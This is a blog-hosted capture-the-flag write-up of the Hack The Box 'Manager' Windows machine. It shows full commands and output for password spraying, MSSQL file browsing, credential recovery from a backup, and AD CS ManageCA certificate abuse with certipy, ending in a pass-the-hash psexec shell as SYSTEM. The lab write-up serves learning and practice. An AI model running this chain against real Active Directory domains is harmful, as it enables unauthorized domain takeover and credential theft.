<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Manager | foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Manager</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-10-26T23:18:49.000Z" id="date"> 2023-10-27</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-01-28T12:47:42.182Z" id="updated"> 2025-01-28</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 20px;">

  <!-- Image Section -->
  <div style="flex: 1 1 auto; max-width: 300px; text-align: center;" class='item-img' data-src='manager.png'><img src="manager.png" title="Manager" width="300px" height="300px" style="pointer-events: none; max-width: 100%; height: auto;">
  </div>

  <!-- Details Section -->
  <div style="flex: 1 1 300px; display: flex; flex-direction: column; text-align: left;">
    <div style="display: flex; align-items: center; margin-bottom: 10px;">
      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='windows.png'><img src="windows.png" alt="Windows" width="20px" height="20px" style="margin-left: 5px;">
      <span style="margin-left: 5px;">Windows</span>
    </div>
    <div style="display: flex; align-items: center; margin-bottom: 10px;">
      <strong style="margin-right: 5px;">Difficulty:</strong>
      <span>Medium</span>
    </div>
    <div style="display: flex; align-items: center; margin-bottom: 10px;">
      <strong style="margin-right: 5px;">Author:</strong>
      <span>Geiseric</span>
    </div>
    <div style="display: flex; align-items: center;">
      <strong style="margin-right: 5px;">Release Date:</strong>
      <span>October 21, 2023</span>
    </div>
  </div>

</div>

<style>
  @media (max-width: 600px) {
    div[style*="display: flex; flex-wrap: wrap;"] {
      flex-direction: column;
      align-items: center;
    }

    div[style*="flex: 1 1 auto;"] {
      max-width: 100%;
      text-align: center;
    }

    div[style*="flex: 1 1 300px;"] {
      flex: 1 1 auto;
      max-width: 100%;
    }
  }
</style>


<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.11.236<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 21:50 WEST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.236<br>Host is up (0.059s latency).<br>Not shown: 987 filtered tcp ports (no-response)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>80/tcp   open  http          Microsoft IIS httpd 10.0<br>|_http-title: Manager<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-27 03:50:31Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.<br>| ssl-cert: Subject: commonName=dc01.manager.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb<br>| Not valid before: 2023-07-30T13:51:28<br>|_Not valid after:  2024-07-29T13:51:28<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.<br>| ssl-cert: Subject: commonName=dc01.manager.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb<br>| Not valid before: 2023-07-30T13:51:28<br>|_Not valid after:  2024-07-29T13:51:28<br>1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: 2023-10-26T02:26:14<br>|_Not valid after:  2053-10-26T02:26:14<br>|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)<br>|_ms-sql-info: ERROR: Script execution failed (use -d to debug)<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=dc01.manager.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb<br>| Not valid before: 2023-07-30T13:51:28<br>|_Not valid after:  2024-07-29T13:51:28<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.<br>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=dc01.manager.htb<br>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.manager.htb<br>| Not valid before: 2023-07-30T13:51:28<br>|_Not valid after:  2024-07-29T13:51:28<br>|_ssl-<span class="hljs-built_in">date</span>: 2023-10-27T03:51:51+00:00; +7h00m00s from scanner time.<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-10-27T03:51:11<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s<br><br></code></pre></td></tr></table></figure>

<p>Important services from the scan:<br>    - 53&#x2F;tcp   DNS<br>    - 80&#x2F;tcp   Microsoft IIS<br>    - 1433&#x2F;tcp Microsoft SQL Server 2019<br>    - 389&#x2F;tcp  Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)</p>
<p>Add the domain to the &#x2F;etc&#x2F;hosts file<br class='item-img' data-src='/HTB/Manager/hosts.png'><img src="/HTB/Manager/hosts.png"></p>
<h3 id="HTTP-Page"><a href="#HTTP-Page" class="headerlink" title="HTTP Page"></a>HTTP Page</h3><p>I didn’t find anything useful on the webpage running on port 80<br class='item-img' data-src='/HTB/Manager/webpage.png'><img src="/HTB/Manager/webpage.png"></p>
<h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h3><p>Gobuster found nothing useful either</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gobuster <span class="hljs-built_in">dir</span> --url 10.10.11.236 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.11.236<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2023/10/26 21:53:30 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 150] [--&gt; http://10.10.11.236/images/]<br>/Images               (Status: 301) [Size: 150] [--&gt; http://10.10.11.236/Images/]<br>/css                  (Status: 301) [Size: 147] [--&gt; http://10.10.11.236/css/]   <br>/js                   (Status: 301) [Size: 146] [--&gt; http://10.10.11.236/js/]    <br>/IMAGES               (Status: 301) [Size: 150] [--&gt; http://10.10.11.236/IMAGES/]<br>/CSS                  (Status: 301) [Size: 147] [--&gt; http://10.10.11.236/CSS/]   <br>/JS                   (Status: 301) [Size: 146] [--&gt; http://10.10.11.236/JS/]    <br>                                                                                 <br>===============================================================<br>2023/10/26 22:15:43 Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure>


<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>smbclient allowed access with an anonymous login, so I attempted to get more info through the service</p>
<h2 id="FootHold"><a href="#FootHold" class="headerlink" title="FootHold"></a>FootHold</h2><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cme smb 10.10.11.236 -u anonymous -p <span class="hljs-string">&quot;&quot;</span> --rid-brute <br></code></pre></td></tr></table></figure>
<p>cme found 7 users<br class='item-img' data-src='/HTB/Manager/users.png'><img src="/HTB/Manager/users.png"></p>
<p>I added all the usernames to a .txt file and ran cme again with the newly obtained usernames to try and get a login</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cme smb 10.10.11.236 -u users.txt -p users.txt --no-brute <br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Manager/operator.png'><img src="/HTB/Manager/operator.png"></p>
<p>We get a valid login<br>User: operator<br>Password: operator</p>
<h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><p>With the obtained login, we can login into the SQL Server using Windows Authentication</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mssqlclient.py -port 1433 manager.htb/operator:operator@10.10.11.236 -windows-auth <br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Manager/sql1.png'><img src="/HTB/Manager/sql1.png"></p>
<p>We can use EXEC xp_dirtree to navigate the filesystem<br>Ended up finding a website backup zip file in the website root folder (C:\inetpub\wwwroot)</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">EXEC xp_dirtree &#x27;C:\inetpub\wwwroot&#x27;, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Manager/sql2.png'><img src="/HTB/Manager/sql2.png"></p>
<p>Since it is in the root folder of the website, we can download it just by adding it to the link in our browser<br class='item-img' data-src='/HTB/Manager/backupdownload.png'><img src="/HTB/Manager/backupdownload.png"></p>
<h3 id="User-Login"><a href="#User-Login" class="headerlink" title="User Login"></a>User Login</h3><p>After unzipping the file, these are the files we get<br class='item-img' data-src='/HTB/Manager/backupfiles.png'><img src="/HTB/Manager/backupfiles.png"></p>
<p>In the .old-conf.xml file we get the user raven password<br class='item-img' data-src='/HTB/Manager/ravenpassword.png'><img src="/HTB/Manager/ravenpassword.png"></p>
<h3 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h3><p>We can now evil-winrm into the machine and get the user.txt flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ evil-winrm -i 10.10.11.236 -u raven -p <span class="hljs-string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Manager/userflag.png'><img src="/HTB/Manager/userflag.png"></p>
<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="Privileges-Certificates"><a href="#Privileges-Certificates" class="headerlink" title="Privileges&#x2F;Certificates"></a>Privileges&#x2F;Certificates</h3><p>First I checked the current privileges:</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">whoami /priv<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/HTB/Manager/privs.png'><img src="/HTB/Manager/privs.png"></p>
<p>I then ran <a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">GhostPack’s Certify.exe</a> to check for vulnerable certificates</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cmd">*Evil-WinRM* PS C:\Users\Raven\Desktop&gt; ./Certify.exe <span class="hljs-built_in">find</span> /vulnerable<br><br>   _____          _   _  __<br>  / ____|        | | (_)/ _|<br> | |     ___ _ __| |_ _| |_ _   _<br> | |    / _ \ &#x27;__| __| |  _| | | |<br> | |___|  __/ |  | |_| | | | |_| |<br>  \_____\___|_|   \__|_|_|  \__, |<br>                             __/ |<br>                            |___./<br>  v1.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><br>[*] Action: <span class="hljs-built_in">Find</span> certificate templates<br>[*] Using the search base &#x27;CN=Configuration,DC=manager,DC=htb&#x27;<br><br>[*] Listing info about the Enterprise CA &#x27;manager-DC01-CA&#x27;<br><br>    Enterprise CA Name            : manager-DC01-CA<br>    DNS Hostname                  : dc01.manager.htb<br>    FullName                      : dc01.manager.htb\manager-DC01-CA<br>    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED<br>    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb<br>    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023<br>    Cert Serial                   : <span class="hljs-number">5150</span>CE6EC048749448C7390A52F264BB<br>    Cert <span class="hljs-built_in">Start</span> <span class="hljs-built_in">Date</span>               : <span class="hljs-number">7</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">3</span>:<span class="hljs-number">21</span>:<span class="hljs-number">05</span> AM<br>    Cert End <span class="hljs-built_in">Date</span>                 : <span class="hljs-number">7</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2122</span> <span class="hljs-number">3</span>:<span class="hljs-number">31</span>:<span class="hljs-number">04</span> AM<br>    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb<br>    UserSpecifiedSAN              : Disabled<br>    CA Permissions                :<br><span class="hljs-function">      Owner: <span class="hljs-title">BUILTIN</span>\<span class="hljs-title">Administrators</span>        <span class="hljs-title">S</span>-1-5-32-544</span><br><span class="hljs-function"></span><br><span class="hljs-function">      <span class="hljs-title">Access</span> <span class="hljs-title">Rights</span>                                     <span class="hljs-title">Principal</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">      <span class="hljs-title">Deny</span>   <span class="hljs-title">ManageCA</span>, <span class="hljs-title">Read</span>                             <span class="hljs-title">MANAGER</span>\<span class="hljs-title">Operator</span>              <span class="hljs-title">S</span>-1-5-21-4078382237-1492182817-2568127209-1119</span><br><span class="hljs-function">      <span class="hljs-title">Allow</span>  <span class="hljs-title">Enroll</span>                                     <span class="hljs-title">NT</span> <span class="hljs-title">AUTHORITY</span>\<span class="hljs-title">Authenticated</span> <span class="hljs-title">UsersS</span>-1-5-11</span><br><span class="hljs-function">      <span class="hljs-title">Allow</span>  <span class="hljs-title">ManageCA</span>, <span class="hljs-title">ManageCertificates</span>               <span class="hljs-title">BUILTIN</span>\<span class="hljs-title">Administrators</span>        <span class="hljs-title">S</span>-1-5-32-544</span><br><span class="hljs-function">      <span class="hljs-title">Allow</span>  <span class="hljs-title">ManageCA</span>, <span class="hljs-title">ManageCertificates</span>               <span class="hljs-title">MANAGER</span>\<span class="hljs-title">Domain</span> <span class="hljs-title">Admins</span>         <span class="hljs-title">S</span>-1-5-21-4078382237-1492182817-2568127209-512</span><br><span class="hljs-function">      <span class="hljs-title">Allow</span>  <span class="hljs-title">ManageCA</span>, <span class="hljs-title">ManageCertificates</span>               <span class="hljs-title">MANAGER</span>\<span class="hljs-title">Enterprise</span> <span class="hljs-title">Admins</span>     <span class="hljs-title">S</span>-1-5-21-4078382237-1492182817-2568127209-519</span><br><span class="hljs-function">      <span class="hljs-title">Allow</span>  <span class="hljs-title">ManageCA</span>, <span class="hljs-title">Enroll</span>                           <span class="hljs-title">MANAGER</span>\<span class="hljs-title">Raven</span>                 <span class="hljs-title">S</span>-1-5-21-4078382237-1492182817-2568127209-1116</span><br><span class="hljs-function">      <span class="hljs-title">Allow</span>  <span class="hljs-title">Enroll</span>                                     <span class="hljs-title">MANAGER</span>\<span class="hljs-title">Operator</span>              <span class="hljs-title">S</span>-1-5-21-4078382237-1492182817-2568127209-1119</span><br><span class="hljs-function">    <span class="hljs-title">Enrollment</span> <span class="hljs-title">Agent</span> <span class="hljs-title">Restrictions</span> : <span class="hljs-title">None</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">[+] <span class="hljs-title">No</span> <span class="hljs-title">Vulnerable</span> <span class="hljs-title">Certificates</span> <span class="hljs-title">Templates</span> <span class="hljs-title">found</span>!</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure>

<p>Even though it found no Vulnerable Certificates, we see that Raven has ManageCA permission.<br>And with Manage CA permission, we can use this <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2">attack</a> to escalate our privileges</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>“The technique relies on the fact that users with the Manage CA and Manage Certificates access right can issue failed certificate requests. The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.”</p>
<p>So first we add raven as an officer</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy ca -ca <span class="hljs-string">&#x27;manager-DC01-CA&#x27;</span> -add-officer raven -username raven@manager.htb -password <span class="hljs-string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span><br>Certipy v4.8.2 - by Oliver Lyak (ly4k)<br><br>[*] Successfully added officer <span class="hljs-string">&#x27;Raven&#x27;</span> on <span class="hljs-string">&#x27;manager-DC01-CA&#x27;</span><br></code></pre></td></tr></table></figure>

<p>Then we enable the SubCA template</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy ca -ca <span class="hljs-string">&#x27;manager-DC01-CA&#x27;</span> -enable-template SubCA -username raven@manager.htb -password <span class="hljs-string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span><br>Certipy v4.8.2 - by Oliver Lyak (ly4k)<br><br>[*] Successfully enabled <span class="hljs-string">&#x27;SubCA&#x27;</span> on <span class="hljs-string">&#x27;manager-DC01-CA&#x27;</span><br></code></pre></td></tr></table></figure>

<p>Now we can request a certificate based on the SubCA template, it will be denied but we will get the Request ID and the private key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy req -username raven@manager.htb -password <span class="hljs-string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca <span class="hljs-string">&#x27;manager-DC01-CA&#x27;</span> -target 10.10.11.236 -template SubCA -upn administrator@manager.htb<br>Certipy v4.8.2 - by Oliver Lyak (ly4k)<br><br>[*] Requesting certificate via RPC<br>[-] Got error <span class="hljs-keyword">while</span> trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span class="hljs-keyword">do</span> not allow the current user to enroll <span class="hljs-keyword">for</span> this <span class="hljs-built_in">type</span> of certificate.<br>[*] Request ID is 20<br>Would you like to save the private key? (y/N) y<br>[*] Saved private key to 20.key<br>[-] Failed to request certificate<br></code></pre></td></tr></table></figure>
<p>The Request ID is 20 in this case<br>Since we have the Manage CA and Manage Certificates privilege, we can now issue the failed certificate with the obtained ID</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy ca -ca <span class="hljs-string">&#x27;manager-DC01-CA&#x27;</span> -issue-request 20 -username raven@manager.htb -password <span class="hljs-string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span><br>Certipy v4.8.2 - by Oliver Lyak (ly4k)<br><br>[*] Successfully issued certificate<br></code></pre></td></tr></table></figure>

<p>Finally we retrieve the certificate</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy req -username raven@manager.htb -password <span class="hljs-string">&#x27;R4v3nBe5tD3veloP3r!123&#x27;</span> -ca <span class="hljs-string">&#x27;manager-DC01-CA&#x27;</span> -target 10.10.11.236 -retrieve 20<br>Certipy v4.8.2 - by Oliver Lyak (ly4k)<br><br>[*] Rerieving certificate with ID 20<br>[*] Successfully retrieved certificate<br>[*] Got certificate with UPN <span class="hljs-string">&#x27;administrator@manager.htb&#x27;</span><br>[*] Certificate has no object SID<br>[*] Loaded private key from <span class="hljs-string">&#x27;20.key&#x27;</span><br>[*] Saved certificate and private key to <span class="hljs-string">&#x27;administrator.pfx&#x27;</span><br></code></pre></td></tr></table></figure>

<p>To finally be able to login as administrator, we can get the administrator hashes by using the obtained certificate and private key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ certipy auth -pfx <span class="hljs-string">&#x27;administrator.pfx&#x27;</span> -username <span class="hljs-string">&#x27;administrator&#x27;</span> -domain <span class="hljs-string">&#x27;manager.htb&#x27;</span> -dc-ip 10.10.11.236<br>Certipy v4.8.2 - by Oliver Lyak (ly4k)<br><br>[*] Using principal: administrator@manager.htb<br>[*] Trying to get TGT...<br>[*] Got TGT<br>[*] Saved credential cache to <span class="hljs-string">&#x27;administrator.ccache&#x27;</span><br>[*] Trying to retrieve NT <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator&#x27;</span><br>[*] Got <span class="hljs-built_in">hash</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;administrator@manager.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef<br></code></pre></td></tr></table></figure>

<p>With the obtained hash, we can login as administrator</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ psexec.py manager.htb/administrator@manager.htb -hashes aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef -dc-ip 10.10.11.236<br>Impacket v0.11.0 - Copyright 2023 Fortra<br><br>[*] Requesting shares on manager.htb.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file tSHvDKPA.exe<br>[*] Opening SVCManager on manager.htb.....<br>[*] Creating service Cuaw on manager.htb.....<br>[*] Starting service Cuaw.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version 10.0.17763.4974]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure>

<h3 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h3><p>All we have left to do is get the root.txt flag<br class='item-img' data-src='/HTB/Manager/rootflag.png'><img src="/HTB/Manager/rootflag.png"></p>
